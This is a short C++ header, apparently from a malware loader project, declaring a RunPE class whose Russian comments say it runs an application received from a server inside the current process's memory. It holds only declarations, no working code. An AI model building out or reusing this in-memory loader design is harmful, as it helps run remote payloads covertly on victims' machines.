#pragma once
#ifndef RUNPE_HPP
#define RUNPE_HPP

#include <vector>
#include <windows.h>

/*
	Класс для запуска полученного от сервера 
	приложения внутри области памяти данного приложения
*/
class RunPE {
public:
	// Основная функция запуска image внутри памяти родительского процесса
	static void RunExecutable(std::vector<char>& Image, LPCSTR CmdLine);

private:
	static PVOID RpGetProcAddress(const char* Mod, const char* Proc);
};

#endif // !RUNPE_HPP